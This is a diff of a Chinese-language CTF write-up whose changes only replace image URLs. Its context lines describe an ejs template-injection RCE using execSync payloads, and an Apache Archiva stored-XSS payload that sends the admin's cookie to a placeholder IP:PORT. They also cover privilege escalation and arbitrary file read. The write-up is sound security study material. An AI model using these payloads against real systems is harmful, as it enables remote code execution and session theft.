@@ -86,11 +86,11 @@ app.listen(process.env.PORT || 3000);
 
 接下来似乎可能的利用点只剩下使用ejs进行模板渲染的部分了。首先搜索了一下ejs最近的洞，找到了这个 https://securitylab.github.com/advisories/GHSL-2021-021-tj-ejs/ ，成因和题目里给的情况差不多，就是把代表整个HTTP参数的对象当作了ejs渲染的`options`参数，使得一些能够控制ejs渲染的参数可以通过HTTP参数控制。但是嘛……这个洞在3.1.6之后的版本就被修了，加了对传入的三个参数加了正则匹配，没法使用这个方法来注入代码了。
 
-![](https://pic.hujiekang.top/uploads/big/5fb128ef04124fa06fd59bd620d800fc.png)
+![](https://images.hujiekang.top/blogimage-5fb128ef04124fa06fd59bd620d800fc-436004f6.png)
 
 于是乎只能另寻他路。通过断点调试可以发现，`renderFile()`方法中取了传入参数的`settings['view options']`，将其Copy到最终渲染的参数对象中。
 
-![](https://pic.hujiekang.top/uploads/big/7008f6a7fe49872f4d267d1218f4e75d.png)
+![](https://images.hujiekang.top/blogimage-7008f6a7fe49872f4d267d1218f4e75d-b9faa029.png)
 
 进一步就来到了`Template()`构造函数和`Template.compile()`方法中，可以看见里面初始化了很多渲染参数，而由上面的代码可知，这些参数都可以被控制，这就比较有意思了。
 
@@ -137,7 +137,7 @@ compile: function () {
 
 因此，只需要确保`opts.client`存在，就能够把自定义的`escapeFn`写进最终生成的代码中。最终传参如下图，`escapeFn`中调用了同样是生成的函数`__append()`，里面调用了RCE的代码，这样可以直接把命令执行的输出附加到模板的输出中：
 
-![](https://pic.hujiekang.top/uploads/big/e3925dbe624168e0b1e570c7cc0d3e28.png)
+![](https://images.hujiekang.top/blogimage-e3925dbe624168e0b1e570c7cc0d3e28-e2400de7.png)
 
 - `global.process.mainModule.constructor._load('child_process').execSync('whoami').toString()`
 - `process.mainModule.require('child_process').execSync('whoami').toString()`
@@ -162,7 +162,7 @@ function Template(text, opts) {
 
 如下图，模板内容为`<.- process.mainModule.require('child_process').execSync(name).toString() .>`将尖括号里面的分隔符从`%`改成了`.`，使用RAW模式不转义直接输出返回值，绕过了限制直接RCE。
 
-![](https://pic.hujiekang.top/uploads/big/db932642fc6e6e7c0eed7622b012a53e.png)
+![](https://images.hujiekang.top/blogimage-db932642fc6e6e7c0eed7622b012a53e-18503118.png)
 
 在打的时候，发现题目的docker环境中模板会缓存，本地能打通的请求远程用浏览器打死活打不通。。后面用Burp，不会在提交模板后自动跳转，使得第一次请求能够成功，但是后面的每一次请求都是第一次的返回结果，只得每修改一次exp就重新建一个新模板。在看官方给的WriteUp中提到了Dockerfile中定义了`NODE_ENV=production`，使得ejs自动开启了页面的缓存，这个选项虽然也可以被控制，但似乎并没有效果。
 
@@ -225,11 +225,11 @@ print('Done visiting', flush=True)
 
 首先看看这个普通的账户可以干什么。与不登陆相比，登陆后新增了一个Upload Artifact的入口，功能是可以向Archiva里管理的仓库里上传代码和二进制文件。
 
-![](https://pic.hujiekang.top/uploads/big/ac34c63757aeb9473a2cf558083d57f6.png)
+![](https://images.hujiekang.top/blogimage-ac34c63757aeb9473a2cf558083d57f6-5ec3b6ab.png)
 
 随便上传一个Artifact，在Bot要访问的`/repository/internal`下就可以看见对应的目录结构已经被建立了。如下图，URI为`/repository/internal/123/456/789/`，对应Groupd ID为123，Artifact ID为456，Version为789，包名为000。
 
-![](https://pic.hujiekang.top/uploads/big/ef3d88a4240829fd5fe0e31513530175.png)
+![](https://images.hujiekang.top/blogimage-ef3d88a4240829fd5fe0e31513530175-1ca42c65.png)
 
 很容易发现Groupd ID这部分的数据会直接显示在`/repository/internal`的页面中，那么接下来就可以尝试一下能否XSS了。看了一下Archiva的源代码，发现这里还是存在一些Filter的，但是规则比较简单，只过滤了路径相关的字符：
 
@@ -263,7 +263,7 @@ private void checkParamChars(String param, String value) throws ArchivaRestServi
 
 随便写了个alert，成功写入：
 
-![](https://pic.hujiekang.top/uploads/medium/a2165fd4ebeaf4649401cbd72544318d.png)
+![](https://images.hujiekang.top/blogimage-a2165fd4ebeaf4649401cbd72544318d-a0f9190e.png)
 
 接下来尝试盗取Cookie。虽然代码中的过滤就这么几个，但是实际测试的时候`.`也会被截断，所以最后拼合的Payload直接用了Base64编码：
 
@@ -271,19 +271,19 @@ private void checkParamChars(String param, String value) throws ArchivaRestServi
 "><img src=2 onerror=fetch(atob("[Base64 http://IP:PORT/]")+btoa(eval(atob("ZG9jdW1lbnQuY29va2ll"))))><!--
 ```
 
-![](https://pic.hujiekang.top/uploads/big/95ad8d5f83d424a23b2777efdaf691f2.png)
+![](https://images.hujiekang.top/blogimage-95ad8d5f83d424a23b2777efdaf691f2-11a0faea.png)
 
 获取到管理员的Cookie之后，因为题目附件给的docker环境中管理员账户也是可以登录的，因此可以直接对相关的接口抓包。首先在题目中显然是不知道管理员账户原有的密码的，因此无法通过修改管理员密码来持久化权限。但是在Archiva中可以管理所有账户的权限和角色，将普通账户ctf的权限修改为Administrator，即可提权。
 
-![](https://pic.hujiekang.top/uploads/big/58c25bb80b0a60e31458f87fe58f5565.png)
+![](https://images.hujiekang.top/blogimage-58c25bb80b0a60e31458f87fe58f5565-3e2b4e06.png)
 
 提权之后，能够做的事情就比普通用户多很多了。首先注意到可以新建和管理已存在的软件仓库，在仓库的选项页面，可以指定Directory，也就是仓库目录的位置。将其修改为根目录`/`，就相当于把整个系统目录当成仓库创建了，也就可以读取任意文件了。
 
-![](https://pic.hujiekang.top/uploads/big/150e89ed4ac6176d8e428791995c48fe.png)
+![](https://images.hujiekang.top/blogimage-150e89ed4ac6176d8e428791995c48fe-98ecfcb0.png)
 
 在创建仓库的时候会提示无法创建/.indexer文件的错误，但是仓库已经被创建好了，直接访问即可，实现了任意文件读取。
 
-![](https://pic.hujiekang.top/uploads/big/a1da2ae8954595ca8cb097e6545aa030.png)
+![](https://images.hujiekang.top/blogimage-a1da2ae8954595ca8cb097e6545aa030-beeaf01d.png)
 
 进一步，由于当前版本的Archiva没有其他漏洞，且题目环境默认是禁止JSP的解析的，所以也就没法RCE了。
 
@@ -295,7 +295,7 @@ Reference: https://hxp.io/blog/100/hxp-CTF-2022-archived/
 
 零零散散的JS文件中大部分都是算术运算，其他文件中的逻辑代码，要么用于最终输出，要么用于清除require缓存，要么用于require……但最终发现都对Flag的加密流程没有任何影响。于是首先用脚本在每个JS文件的头部添加一个console.log，输出其文件名以及闭包的所有参数值，便于后续的反推。然后跑一下主文件，就能得到一个调用序列：
 
-![](https://pic.hujiekang.top/uploads/big/d9a4263477e71800728781ef798caec5.png)
+![](https://images.hujiekang.top/blogimage-d9a4263477e71800728781ef798caec5-8047e82a.png)
 
 对其进行处理，去除无效的文件，最终得到的就是纯算术运算的序列。直接上处理代码：
 
